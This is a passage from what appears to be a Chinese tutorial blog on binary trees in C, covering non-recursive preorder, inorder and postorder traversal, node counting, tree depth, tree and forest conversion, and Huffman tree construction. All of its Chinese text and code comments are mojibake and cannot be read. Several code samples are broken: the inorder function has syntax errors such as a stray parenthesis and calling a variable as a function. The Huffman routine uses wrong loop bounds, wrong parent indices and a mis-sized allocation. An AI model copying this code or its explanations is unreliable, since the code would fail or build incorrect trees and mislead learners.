ˆï¼Œå·¦å­©å­ç›´æ¥è®¿é—®ï¼Œç›´åˆ°éå†å®Œæ‰€æœ‰çš„å·¦å­©å­ï¼Œåˆ¤æ–­æ ˆç©ºï¼Œå¦‚æœä¸ç©ºï¼Œå¼¹å‡ºï¼Œè®¿é—®å³ç»“ç‚¹ï¼Œç›´åˆ°æ ˆç©º</p><ul><li>ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder_NRecursion2</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStack lstack;<span class="comment">//å®šä¹‰é“¾æ ˆ</span></span><br><span class="line">    BinTreeNode *p = bt;</span><br><span class="line">    lstack = SetNullStack_Link();<span class="comment">//åˆå§‹åŒ–é“¾æ ˆ</span></span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Push_link(lstack,bt);</span><br><span class="line">    <span class="keyword">while</span>(!IsNullStack_link(lstack))<span class="comment">//å½“æ ˆä¸ç©ºæ—¶</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = Top_link(lstack);</span><br><span class="line">        Pop_link(lstack);</span><br><span class="line">        <span class="keyword">while</span>(p)<span class="comment">//å½“å·¦ç»“ç‚¹ä¸ç©ºæ—¶</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);<span class="comment">//è®¿é—®ç»“ç‚¹</span></span><br><span class="line">            <span class="keyword">if</span>(p-&gt;rightchild)</span><br><span class="line">                Push_link(lstack,p-&gt;rightchild);</span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸­åºéå†-2"><a href="#ä¸­åºéå†-2" class="headerlink" title="ä¸­åºéå†"></a>ä¸­åºéå†</h3><ul><li>ç®—æ³•æ€è·¯ï¼š</li></ul><p>å…ˆè®©æ‰€æœ‰å·¦åˆ†æ”¯çš„ç»“ç‚¹å…¥æ ˆï¼Œç„¶åå€’åºè®¿é—®ï¼Œæ¯è®¿é—®ä¸€ä¸ªç»“ç‚¹è¿‡åè®¿é—®å…¶å³å­æ ‘ï¼Œå¦‚æœå³å­æ ‘æœ‰å†…å®¹ï¼Œåˆ™é‡å¤è®©å³å­æ ‘æ‰€æœ‰ç»“ç‚¹å…¥æ ˆï¼Œç›´åˆ°å³å­æ ‘ä¸ºç©ºæˆ–è€…æ ˆä¸ºç©ºï¼Œéå†å®Œæˆ</p><ul><li>ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> InOrder)NRecursion1(BinTree bt)</span><br><span class="line">&#123;</span><br><span class="line">    LinkStack lstack;</span><br><span class="line">    lstack = SetNullStack_Link();</span><br><span class="line">    BinTree p;</span><br><span class="line">    p = bt;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Push_link(lstack,bt);<span class="comment">//æ ¹ç»“ç‚¹è¿›æ ˆ</span></span><br><span class="line">    p = p-&gt;leftchild;<span class="comment">//è®¿é—®å·¦å­æ ‘</span></span><br><span class="line">    <span class="keyword">while</span>(p||!IsNullStack_link(lstack))<span class="comment">//å½“pä¸ç©ºæˆ–æ ˆä¸ºç©ºæ—¶è·³å‡ºå¾ªç¯</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)<span class="comment">//å½“pä¸ç©º</span></span><br><span class="line">        &#123;</span><br><span class="line">            Push_link(lstack, p);<span class="comment">//å·¦å­æ ‘ç»“ç‚¹ä¸æ–­è¿›æ ˆ</span></span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p = Top_link(lstack());<span class="comment">//å–æ ˆé¡¶å…ƒç´ è®¿é—®</span></span><br><span class="line">        Pop_link(lstack);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;rightchild;<span class="comment">//è®¿é—®ç»“ç‚¹çš„å³å­æ ‘</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ååºéå†-2"><a href="#ååºéå†-2" class="headerlink" title="ååºéå†"></a>ååºéå†</h3><ul><li>ç®—æ³•æ€è·¯ï¼š</li></ul><p>&#x3D;&#x3D;è®¿é—®çš„ç¬¬ä¸€ä¸ªç»“ç‚¹åº”è¯¥æ˜¯å¶å­ç»“ç‚¹&#x3D;&#x3D;</p><p>å…ˆè®©æ‰€æœ‰çš„å·¦åˆ†æ”¯çš„ç»“ç‚¹å…¥æ ˆï¼Œç„¶åæ£€æŸ¥å³åˆ†æ”¯ï¼Œå¦‚æœå³åˆ†æ”¯ä¸ä¸ºç©ºåˆ™ç»§ç»­æ£€æŸ¥å³åˆ†æ”¯çš„å·¦åˆ†æ”¯ï¼Œç›´åˆ°ä¸€ä¸ªç»“ç‚¹çš„å·¦å³ä¸¤åˆ†æ”¯éƒ½ä¸ºç©ºï¼Œè¯¥ç»“ç‚¹å‡ºæ ˆï¼Œè®¿é—®</p><p>å¦‚æœè¯¥ç»“ç‚¹æ˜¯çˆ¶ç»“ç‚¹çš„å·¦å­©å­ï¼Œåˆ™ç»§ç»­è¿›å…¥çˆ¶ç»“ç‚¹çš„å³åˆ†æ”¯æ£€æŸ¥å³åˆ†æ”¯çš„å·¦åˆ†æ”¯</p><p>å¦‚æœè¯¥ç»“ç‚¹æ˜¯çˆ¶ç»“ç‚¹çš„å³å­©å­ï¼Œåˆ™è®¿é—®å…¶çˆ¶ç»“ç‚¹ï¼Œé€€å›åˆ°ä¸Šä¸€å±‚</p><p>ç›´åˆ°å¶å­ç»“ç‚¹ä¸ºç©ºä¸”æ ˆä¹Ÿç©º</p><ul><li>ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder_NRecursion</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    BinTree p = bt;</span><br><span class="line">    LinkStack lstack;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    lstack = SetNullStack_Link();</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span> || !IsNullStack_link(lstack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Push_link(lstack,p);</span><br><span class="line">            p = p-&gt;leftchild? p-&gt;leftchild:p-&gt;rightchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p = Top_link(lstack);</span><br><span class="line">        Pop_link(lstack);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        <span class="keyword">if</span>(!IsNullStack_link(lstack)&amp;&amp;(Top_link(lstack)-&gt;leftchild == p))</span><br><span class="line">            p = (Top_link(lstack))-&gt;rightchild;<span class="comment">//å¦‚æœå½“å‰ç»“ç‚¹æ˜¯çˆ¶ç»“ç‚¹çš„å·¦å­æ ‘ï¼Œè¿›å…¥çˆ¶ç»“ç‚¹çš„å³å­æ ‘</span></span><br><span class="line">        <span class="keyword">else</span> p = <span class="literal">NULL</span>;<span class="comment">//å¦‚æœå½“å‰ç»“ç‚¹æ˜¯çˆ¶ç»“ç‚¹çš„å³å­æ ‘ï¼Œé€€å›åˆ°ä¸Šä¸€ç»“ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æ ‘çš„å…¶ä»–æ“ä½œ"><a href="#äºŒå‰æ ‘çš„å…¶ä»–æ“ä½œ" class="headerlink" title="äºŒå‰æ ‘çš„å…¶ä»–æ“ä½œ"></a>äºŒå‰æ ‘çš„å…¶ä»–æ“ä½œ</h2><h3 id="ç»Ÿè®¡äºŒå‰æ ‘å¶å­ç»“ç‚¹ä¸ªæ•°"><a href="#ç»Ÿè®¡äºŒå‰æ ‘å¶å­ç»“ç‚¹ä¸ªæ•°" class="headerlink" title="ç»Ÿè®¡äºŒå‰æ ‘å¶å­ç»“ç‚¹ä¸ªæ•°"></a>ç»Ÿè®¡äºŒå‰æ ‘å¶å­ç»“ç‚¹ä¸ªæ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CountLeafNode</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//é€’å½’è°ƒç”¨ç»“æŸæ¡ä»¶</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((bt-&gt;leftchild == <span class="literal">NULL</span>)&amp;&amp;(bt-&gt;rightchild == <span class="literal">NULL</span>))<span class="comment">//å¦‚æœæ˜¯å¶å­ç»“ç‚¹è¿”å›1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//é€’å½’éå†å·¦å­æ ‘å’Œå³å­æ ‘</span></span><br><span class="line">        <span class="keyword">return</span>(CountLeafNode(bt-&gt;leftchild) + CountLeafNode(bt-&gt;rightchild));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç»Ÿè®¡äºŒå‰æ ‘æ€»çš„ç»“ç‚¹ä¸ªæ•°"><a href="#ç»Ÿè®¡äºŒå‰æ ‘æ€»çš„ç»“ç‚¹ä¸ªæ•°" class="headerlink" title="ç»Ÿè®¡äºŒå‰æ ‘æ€»çš„ç»“ç‚¹ä¸ªæ•°"></a>ç»Ÿè®¡äºŒå‰æ ‘æ€»çš„ç»“ç‚¹ä¸ªæ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CountNode</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//é€’å½’è°ƒç”¨ç»“æŸæ¡ä»¶</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(CountNode(bt-&gt;leftchild) + CountNode(bt-&gt;rightchild) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç»Ÿè®¡äºŒå‰æ ‘å³ç»“ç‚¹æ•°"><a href="#ç»Ÿè®¡äºŒå‰æ ‘å³ç»“ç‚¹æ•°" class="headerlink" title="ç»Ÿè®¡äºŒå‰æ ‘å³ç»“ç‚¹æ•°"></a>ç»Ÿè®¡äºŒå‰æ ‘å³ç»“ç‚¹æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CountRightNode</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(bt-&gt;rightchild!=<span class="literal">NULL</span>)</span><br><span class="line">        num++;</span><br><span class="line">    num += CountRightNode(bt-&gt;leftchild);</span><br><span class="line">    num += CountRightNode(bt-&gt;rightchild);</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è®¡ç®—äºŒå‰æ ‘çš„æ·±åº¦"><a href="#è®¡ç®—äºŒå‰æ ‘çš„æ·±åº¦" class="headerlink" title="è®¡ç®—äºŒå‰æ ‘çš„æ·±åº¦"></a>è®¡ç®—äºŒå‰æ ‘çš„æ·±åº¦</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CountLevel</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> i = CountLevel(bt-&gt;leftchild);</span><br><span class="line">        <span class="type">int</span> j = CountLevel(bt-&gt;rightchild);</span><br><span class="line">        <span class="keyword">return</span> (i&gt;j?i:j) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æŸ¥æ‰¾æ•°æ®å…ƒç´ "><a href="#æŸ¥æ‰¾æ•°æ®å…ƒç´ " class="headerlink" title="æŸ¥æ‰¾æ•°æ®å…ƒç´ "></a>æŸ¥æ‰¾æ•°æ®å…ƒç´ </h3><blockquote><p>æœ‰ç©ºè®°å¾—è¡¥</p></blockquote><h2 id="æ ‘å’Œæ£®æ—"><a href="#æ ‘å’Œæ£®æ—" class="headerlink" title="æ ‘å’Œæ£®æ—"></a>æ ‘å’Œæ£®æ—</h2><h3 id="æ ‘ã€æ£®æ—è½¬ä¸ºäºŒå‰æ ‘"><a href="#æ ‘ã€æ£®æ—è½¬ä¸ºäºŒå‰æ ‘" class="headerlink" title="æ ‘ã€æ£®æ—è½¬ä¸ºäºŒå‰æ ‘"></a>æ ‘ã€æ£®æ—è½¬ä¸ºäºŒå‰æ ‘</h3><ul><li>åŠ çº¿ï¼šåœ¨æ‰€æœ‰ç›¸é‚»çš„<code>å…„å¼Ÿç»“ç‚¹</code>ä¹‹é—´è¿çº¿</li><li>æŠ¹çº¿ï¼šå¯¹æ¯ä¸ªéç»ˆç«¯ç»“ç‚¹ï¼Œåª<code>ä¿ç•™</code>å®ƒåˆ°å…¶<code>æœ€å·¦å­å¥³</code>çš„è¿çº¿ï¼Œ<code>åˆ å»</code>ä¸<code>å…¶ä»–å­å¥³</code>çš„è¿çº¿</li><li>è°ƒæ•´ï¼šä»¥<code>æ ¹ç»“ç‚¹</code>ä¸ºè½´å¿ƒï¼Œå°†æ•´é¢—æ ‘è¿›è¡Œ<code>æ—‹è½¬</code></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215141452.png"></p><h3 id="äºŒå‰æ ‘è½¬æ¢ä¸ºæ ‘æˆ–æ£®æ—"><a href="#äºŒå‰æ ‘è½¬æ¢ä¸ºæ ‘æˆ–æ£®æ—" class="headerlink" title="äºŒå‰æ ‘è½¬æ¢ä¸ºæ ‘æˆ–æ£®æ—"></a>äºŒå‰æ ‘è½¬æ¢ä¸ºæ ‘æˆ–æ£®æ—</h3><ul><li>åŠ çº¿ï¼šè‹¥pç»“ç‚¹æ—¶åŒäº²ç»“ç‚¹çš„å·¦å­©å­ï¼Œåˆ™å°†pçš„å³å­©å­ï¼Œå³å­©å­çš„å³å­©å­ï¼Œâ€¦ï¼Œæ²¿åˆ†æ”¯æ‰¾åˆ°æ‰€æœ‰çš„å³å­©å­ï¼Œéƒ½ä¸pçš„åŒäº²ç”¨çº¿ç›¸è¿</li><li>æŠ¹çº¿ï¼šæŠ¹æ‰åŸäºŒå‰æ ‘ä¸­åŒäº²ä¸å³å­©å­ä¹‹é—´çš„è¿çº¿</li><li>è°ƒæ•´ï¼šå°†ç»“ç‚¹æŒ‰å±‚æ¬¡æ’åˆ—ï¼Œå½¢æˆæ ‘ç»“æ„</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215141953.png"></p><h2 id="å“ˆå¤«æ›¼æ ‘"><a href="#å“ˆå¤«æ›¼æ ‘" class="headerlink" title="å“ˆå¤«æ›¼æ ‘"></a>å“ˆå¤«æ›¼æ ‘</h2><p><code>WPL</code>ï¼šæ‰©å……äºŒå‰æ ‘çš„å¸¦æƒçš„å¤–éƒ¨è·¯å¾„é•¿åº¦</p><p>â€‹                                                                                       $\displaystyle \sum^{m}_{i \to 0}{w_i \times l_i}$</p><p><strong>w<del>i</del> <strong>æ˜¯ç¬¬ i ä¸ªå¤–éƒ¨ç»“ç‚¹çš„æƒå€¼ï¼Œ <strong>l<del>i</del></strong> æ˜¯ä»æ ¹åˆ°ç¬¬ i ä¸ªå¤–éƒ¨ç»“ç‚¹çš„è·¯å¾„é•¿åº¦ï¼Œ</strong>m</strong>ä¸ºå¤–éƒ¨ç»“ç‚¹çš„ä¸ªæ•°</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215142542.png"></p><h3 id="å“ˆå¤«æ›¼ç®—æ³•"><a href="#å“ˆå¤«æ›¼ç®—æ³•" class="headerlink" title="å“ˆå¤«æ›¼ç®—æ³•"></a>å“ˆå¤«æ›¼ç®—æ³•</h3><ul><li>ç®—æ³•æ€è·¯ï¼š</li></ul><ol><li>ç”±ç»™å®šçš„ m ä¸ªæƒå€¼ <strong>{w<del>1</del>ï¼Œw<del>2</del>ï¼Œâ€¦ï¼Œw<del>m</del>}</strong> æ„é€ æˆ m é¢—äºŒå‰æ ‘é›† F &#x3D; {T<del>1</del>ï¼ŒT<del>2</del>ï¼Œâ€¦ï¼ŒT<del>m</del> }ï¼Œå…¶ä¸­æ¯ä¸€æ£µäºŒå‰æ ‘ T<del>i</del> ä¸­åªæœ‰ä¸€ä¸ªå¸¦æƒä¸º w<del>i</del> çš„æ ¹ç»“ç‚¹ï¼Œä¸”æ ¹ç»“ç‚¹çš„æƒå€¼ä¸º <strong>w<del>i</del></strong></li><li>åœ¨ F ä¸­é€‰å–<code>ä¸¤æ£µæƒå€¼æœ€å°çš„</code>æ ‘ä½œä¸ºå·¦å³å­æ ‘æ„é€ ä¸€æ£µæ–°çš„äºŒå‰æ ‘ï¼Œä¸”<code>æ–°äºŒå‰æ ‘çš„æ ¹ç»“ç‚¹çš„æƒå€¼</code>ä¸ºå…¶å·¦å³å­æ ‘æ ¹ç»“ç‚¹<code>æƒå€¼ä¹‹å’Œ</code></li><li>åœ¨Fä¸­<code>åˆ é™¤</code>è¿™ä¸¤æ£µæ ‘ï¼ŒåŒæ—¶å°†<code>æ–°å¾—åˆ°çš„äºŒå‰æ ‘åŠ å…¥ F ä¸­</code></li><li>é‡å¤ 2. å’Œ 3. ï¼Œ<code>ç›´åˆ° F ä¸­åªå«ä¸€æ£µæ ‘ä¸ºæ­¢</code></li></ol><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215144059.png"></p><ul><li>ç±»å‹å®šä¹‰ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HuffNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> weight;<span class="comment">//æƒå€¼</span></span><br><span class="line">    <span class="type">int</span> parent,leftchild,rightchild;<span class="comment">//çˆ¶ç»“ç‚¹ä¸å·¦å³å­©å­</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">HuffNode</span> *<span class="title">HtNode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">HuffTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> n;<span class="comment">//å“ˆå¤«æ›¼æ ‘çš„å¶å­ç»“ç‚¹ä¸ªæ•°</span></span><br><span class="line">    <span class="type">int</span> root;<span class="comment">//å“ˆå¤«æ›¼æ ‘çš„æ ‘æ ¹</span></span><br><span class="line">    HtNode ht;<span class="comment">//æŒ‡å‘å“ˆå¤«æ›¼æ ‘çš„æŒ‡é’ˆ</span></span><br><span class="line">&#125;*HuffTree;</span><br></pre></td></tr></table></figure><ul><li>ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">HuffTree <span class="title function_">CreateHuffTree</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> *w)</span></span><br><span class="line">&#123;</span><br><span class="line">    HuffTree pht;</span><br><span class="line">    <span class="type">int</span> i, j, x1, x2, min1, min2;</span><br><span class="line">    pht = (HuffTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> HuffNode)*(<span class="number">2</span>*n<span class="number">-1</span>));</span><br><span class="line">    <span class="keyword">if</span>(pht == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Oui of space!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> pht;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä¸ºå“ˆå¤«æ›¼æ ‘ç”³è¯· 2n-1 ä¸ªç©ºé—´</span></span><br><span class="line">    pht-&gt;ht = (HtNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> HuffNode)*(<span class="number">2</span>*n<span class="number">-1</span>));</span><br><span class="line">    <span class="keyword">if</span>(pht-&gt;ht == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Oui of space!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> pht;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–å“ˆå¤«æ›¼æ ‘</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">2</span>*n<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pht-&gt;ht[i].leftchild = <span class="number">-1</span>;<span class="comment">//åˆå§‹åŒ–å¶ç»“ç‚¹çš„å·¦å­©å­</span></span><br><span class="line">        pht-&gt;ht[i].rightchild = <span class="number">-1</span>;<span class="comment">//åˆå§‹åŒ–å¶ç»“ç‚¹çš„å³å­©å­</span></span><br><span class="line">        pht-&gt;ht[i].parent = <span class="number">-1</span>;<span class="comment">//åˆå§‹åŒ–å¶ç»“ç‚¹çš„çˆ¶äº²</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;n)</span><br><span class="line">            pht-&gt;ht[i].weight = w[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pht-&gt;ht[i].weight = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        min1 = MAX;<span class="comment">//min1ä»£è¡¨æœ€å°å€¼</span></span><br><span class="line">        min2 = MAX;<span class="comment">//min2ä»£è¡¨æ¬¡å°å€¼</span></span><br><span class="line">        x1 = <span class="number">-1</span>;<span class="comment">//æœ€å°å€¼ä¸‹æ ‡</span></span><br><span class="line">        x2 = <span class="number">-1</span>;<span class="comment">//æ¬¡å°å€¼ä¸‹æ ‡</span></span><br><span class="line">        <span class="comment">//æ‰¾åˆ°æœ€å°å€¼ä¸‹æ ‡ x1 å¹¶æŠŠæœ€å°å€¼èµ‹ç»™ min1</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n+<span class="number">1</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(pht-&gt;ht[j].weight &lt; min1&amp;&amp;pht-&gt;ht[j].parent == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                min2 = min1;</span><br><span class="line">                x2 = x1;</span><br><span class="line">                min1 = pht-&gt;ht[j].weight;</span><br><span class="line">                x1 = j;</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="comment">//æ‰¾åˆ°æ¬¡å°å€¼ä¸‹æ ‡x2å¹¶æŠŠæ¬¡å°å€¼èµ‹ç»™min2</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pht-&gt;ht[j].weight &lt; min2&amp;&amp;pht-&gt;ht[j].parent == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                min2 = pht-&gt;ht[j].weight;</span><br><span class="line">                x2 = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">//æ„å»º x1ï¼Œx2 çš„çˆ¶ç»“ç‚¹</span></span><br><span class="line">        pht-&gt;ht[x1].parent = n+<span class="number">1</span>;<span class="comment">//x1çˆ¶ç»“ç‚¹ä¸‹æ ‡</span></span><br><span class="line">        pht-&gt;ht[x2].parent = n+<span class="number">1</span>;<span class="comment">//x2çˆ¶ç»“ç‚¹ä¸‹æ ‡</span></span><br><span class="line">        pht-&gt;ht[n + i].weight = min1 + min2;<span class="comment">//çˆ¶ç»“ç‚¹çš„æƒå€¼ä¸ºæå°å€¼åŠ æ¬¡å°å€¼</span></span><br><span class="line">        pht-&gt;ht[n + i].leftchild = x1;<span class="comment">//çˆ¶ç»“ç‚¹çš„å·¦å­©å­ä¸ºx1</span></span><br><span class="line">        pht-&gt;ht[n + i].rightchild = x2;<span 